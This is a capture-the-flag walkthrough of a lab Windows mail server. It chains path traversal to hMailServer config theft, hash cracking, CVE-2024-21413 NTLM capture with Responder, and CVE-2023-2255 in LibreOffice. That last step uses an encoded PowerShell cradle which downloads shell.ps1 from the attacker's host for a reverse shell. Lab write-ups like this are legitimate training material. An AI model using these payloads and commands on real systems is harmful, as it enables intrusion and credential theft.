

## About

Mailing is an easy Windows machine that runs `hMailServer` and hosts a website vulnerable to `Path Traversal`. This vulnerability can be exploited to access the `hMailServer` configuration file, revealing the Administrator password hash. Cracking this hash provides the Administrator password for the email account. We leverage [CVE-2024-21413](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-21413) in the Windows Mail application on the remote host to capture the NTLM hash for user `maya`. We can then crack this hash to obtain the password and log in as user `maya` via WinRM. For privilege escalation, we exploit [CVE-2023-2255](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2255) in `LibreOffice`.


## Nmap

```
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://mailing.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/10.0
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL TOP USER
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: NAMESPACE RIGHTS=texkA0001 SORT ACL QUOTA IDLE completed CAPABILITY OK IMAP4 CHILDREN IMAP4rev1
445/tcp   open  microsoft-ds?
465/tcp   open  ssl/smtp      hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:     bd32 df3f 1d16 08b8 99d2 e39b 6467 297e
| SHA-1:   5c3e 5265 c5bc 68ab aaac 0d8f ab8d 90b4 7895 a3d7
|_SHA-256: 8d7d 9d08 9308 16c7 b0ff 8cf5 6dea 95a4 46df 683a 8516 9ae0 8269 7677 f80b 5b1e
587/tcp   open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:     bd32 df3f 1d16 08b8 99d2 e39b 6467 297e
| SHA-1:   5c3e 5265 c5bc 68ab aaac 0d8f ab8d 90b4 7895 a3d7
|_SHA-256: 8d7d 9d08 9308 16c7 b0ff 8cf5 6dea 95a4 46df 683a 8516 9ae0 8269 7677 f80b 5b1e
993/tcp   open  ssl/imap      hMailServer imapd
|_imap-capabilities: NAMESPACE RIGHTS=texkA0001 SORT ACL QUOTA IDLE completed CAPABILITY OK IMAP4 CHILDREN IMAP4rev1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:     bd32 df3f 1d16 08b8 99d2 e39b 6467 297e
| SHA-1:   5c3e 5265 c5bc 68ab aaac 0d8f ab8d 90b4 7895 a3d7
|_SHA-256: 8d7d 9d08 9308 16c7 b0ff 8cf5 6dea 95a4 46df 683a 8516 9ae0 8269 7677 f80b 5b1e
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
65241/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-08-31T17:54:38
|_  start_date: N/A
```
## Port 80

Browsing website
![](pics/Pasted%20image%2020260831205321.png)

Grabbed 3 potential users
```
ruy
maya
gregory
```

Found this file `.pdf` file which leak some information
![](pics/Pasted%20image%2020260901085001.png)

Email
```
maya@mailing.htb
```

Intercept the request
![](pics/Pasted%20image%2020260901084316.png)


## File disclosure

First lets try to leak the download.php file
```
/download.php?file=../download.php
```

![](pics/Pasted%20image%2020260901085658.png)

Confirmed that this is vulnerable lets try to leak something from windows directory
```
../../Windows/win.ini
```

![](pics/Pasted%20image%2020260901090210.png)

Looking for config files since this runs hmailserver

![](pics/Pasted%20image%2020260901090449.png)

Try this path
```
../../Progra~2/hMailServer\Bin\hMailServer.ini
```

![](pics/Pasted%20image%2020260901090732.png)

Extract admin hash
```
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7

DB
Password=0a9f8ad8bf896b501dde74f08efd7e4c
```

Crack MD5 hash

```
hashcat -m 0 '841bb5acfa6779ae432fd7a4e6600ba7' /usr/share/wordlists/rockyou.txt
```

![](pics/Pasted%20image%2020260901091403.png)

New creds
```
Administrator:homenetworkingadministrator
```

## Login

```
nxc smb 10.129.232.39 -u Administrator -p homenetworkingadministrator  
```

![](pics/Pasted%20image%2020260901093258.png)

Trying the user we found earlier
![](pics/Pasted%20image%2020260901093418.png)

Since this failed I changed focus to the mail server
```bash
swaks --auth LOGIN --auth-user Administrator@mailing.htb --auth-password homenetworkingadministrator --server 10.129.232.39 --quit-after AUTH
```

![](pics/Pasted%20image%2020260901093954.png)

So it is an email creds.

## Exploit Mail

Looking for windows server exploits.
Found this POC

![](pics/Pasted%20image%2020260901094137.png)

The vulnerability is about the way hyperlinks are processed by the outlook if there is a a hyperlink in the email the normal behavior is that a warning message popup, When you put a link using the `file` protocol the warning popup change to an error message

```
file:///\\10.10.10.10\test.txt
```

This is bypassed using `!` and random chars after it.

```
file:///\\10.10.10.10\test.txt!dasdladjladjklsdlkas
```

Outlook would try to access that file via the SMB protocol leaking the local NTLM creds.

Cloned the repo and ran the exploit with these parameters
```bash
python CVE-2024-21413.py --server mailing.htb --port 587 --username "Administrator@mailing.htb" --password "homenetworkingadministrator" --sender "Administrator@mailing.htb" --recipient "maya@mailing.htb" --url '\\10.10.14.82\test\meeting' --subject "Is the mail server running?"
```

Started a SMB server

```
responder -I tun0
```

![](pics/Pasted%20image%2020260902002526.png)

## Crack NTLM

```bash
hashcat 'maya::MAILING:f5c58f3273a8b165:09A4F6B18B43C668BB27F75D33D9D507:010100000000000080C42A5C343ADD0173CAFF890A6F0BE90000000002000800490053003400550001001E00570049004E002D003900330045004E0042004D003100440045003800390004003400570049004E002D003900330045004E0042004D00310044004500380039002E0049005300340055002E004C004F00430041004C000300140049005300340055002E004C004F00430041004C000500140049005300340055002E004C004F00430041004C000700080080C42A5C343ADD010600040002000000080030003000000000000000000000000020000077250B329907C0C6CD087BC934174FFED770A5AA9054552C9335EEC14F81DEB20A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380032000000000000000000' /usr/share/wordlists/rockyou.txt
```

![](pics/Pasted%20image%2020260902002747.png)

Obtained creds

```
maya:m4y4ngs4ri
```

## Flag 1

```
evil-winrm -i 10.129.52.177 -u maya -p m4y4ngs4ri
```

![](pics/Pasted%20image%2020260902003049.png)

## PrivEsc

Enumerate programs installed on the system
Found `Git`, `LiberOffice`

`LibreOffice` Version

![](pics/Pasted%20image%2020260902004520.png)

Looking for privEsc exploit on `7.4` version.

![](pics/Pasted%20image%2020260902004633.png)

Found POC

![](pics/Pasted%20image%2020260902012240.png)

### Create cradle

![](pics/Pasted%20image%2020260902012750.png)

convert to `WCHAR *` and base64 encode it

```
cat cradle| iconv -t utf-16le | base64 -w 0
```

```
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADgAMgA6ADgAMAAwADAALwBzAGgAZQBsAGwALgBwAHMAMQAnACkA
```

![](pics/Pasted%20image%2020260902013033.png)

### Setup the powershell shell

This is what the cradle will download and execute
![](pics/Pasted%20image%2020260902013708.png)

### Convert the cmd to odt file

libreOffice will execute the encoded cradle code which will download our `shell.ps1` and give us a reverse shell

```
python3 CVE-2023-2255.py --cmd "cmd /c powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADgAMgA6ADgAMAAwADAALwBzAGgAZQBsAGwALgBwAHMAMQAnACkA" --output exploit.odt
```

![](pics/Pasted%20image%2020260902014033.png)

Serve the `exploit.odt` and `shell.ps1` on a python server

```
python3 -m http.server
```

![](pics/Pasted%20image%2020260902014213.png)

Download it to the machine

```
curl http://10.10.14.82:8000/exploit.odt -o exploit.odt
```

![](pics/Pasted%20image%2020260902014444.png)

Listen for reverse shell

![](pics/Pasted%20image%2020260902014548.png)
## Flag 2

![](pics/Pasted%20image%2020260902014645.png)

![](pics/Pasted%20image%2020260902014709.png)
